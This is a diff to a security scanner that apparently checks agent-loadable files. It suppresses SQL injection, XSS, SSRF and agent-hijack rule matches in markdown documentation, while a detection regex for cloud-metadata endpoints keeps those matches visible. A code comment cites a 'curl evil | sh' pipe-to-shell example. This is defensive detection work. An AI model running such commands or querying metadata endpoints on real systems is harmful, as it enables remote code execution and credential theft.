@@ -1097,6 +1097,43 @@ def _is_charset_detection_vocab(match: str) -> bool:
     return bool(_CHARSET_DETECTION_VOCAB_RE.match((match or "").strip()))
 
 
+# r* FP iter (2026-05-28) — NON-shell injection/recon-class rules whose
+# match in a MARKDOWN file is always a code EXAMPLE / documentation. Unlike
+# a shell command (``curl evil | sh``), an agent cannot EXECUTE SQL
+# injection / XSS / SSRF / a deserialization gadget by READING a ``.md`` —
+# these are inert example snippets, never an agent-delivery vector. So they
+# are suppressed in markdown (guarded against cloud-metadata SSRF and
+# sensitive-credential reads, which stay visible).
+#
+# DELIBERATELY EXCLUDED (stay demoted-VISIBLE in instruction-loadable .md
+# per the iron rule): CMD_INJECTION / SHELL_EXEC / REVERSE_SHELL (a shell
+# command in inline-code CAN become a delivery vector if the agent runs
+# it), and all hard-signal INTENT / hidden-content / secret rules.
+_MD_DOC_EXAMPLE_RULES: Final[frozenset[str]] = frozenset(
+    {
+        "SQL_INJECTION",
+        "XSS_INJECTION",
+        "SSRF_PATTERN",
+        "SSRF_ADVANCED",
+        "XXE_INJECTION",
+        "DESERIALIZATION",
+        "SSTI",
+        "CONTAINER_ESCAPE",
+        "TOOL_POISONING",
+        "TOOL_SHADOW",
+        "A2A_DATA_LEAK",
+        "A2A_TASK_HIJACK",
+        "ENV_RECON",
+        "RESOURCE_ABUSE",
+    }
+)
+_MD_NEVER_BENIGN_HOST_RE: Final[re.Pattern[str]] = re.compile(
+    r"169\.254\.169\.254|metadata\.google|metadata\.azure|"
+    r"/latest/meta-data|/computeMetadata|fd00:ec2",
+    re.IGNORECASE,
+)
+
+
 def _certain_benign_literal(
     line: str,
     lines: list[str],
@@ -1288,6 +1325,17 @@ def _certain_benign_literal(
     #     visible (iron rule: real prompt-injection prose is the most
     #     dangerous category).
     if rule_id == "INDIRECT_PROMPT_INJECT" and _is_charset_detection_vocab(match):
+        return True
+
+    # (9e) r* FP iter (2026-05-28) — NON-shell injection / recon-class rule
+    #     example in markdown documentation. Inert in a .md (the agent
+    #     cannot execute SQL/XSS/SSRF/etc. by reading docs). Cloud-metadata
+    #     SSRF and sensitive-credential reads stay visible.
+    if (
+        rule_id in _MD_DOC_EXAMPLE_RULES
+        and not _reads_sensitive_path(line)
+        and not _MD_NEVER_BENIGN_HOST_RE.search(line)
+    ):
         return True
 
     # (10e) r10-final-blanket FP iter (2026-05-28) — behavioral-pattern
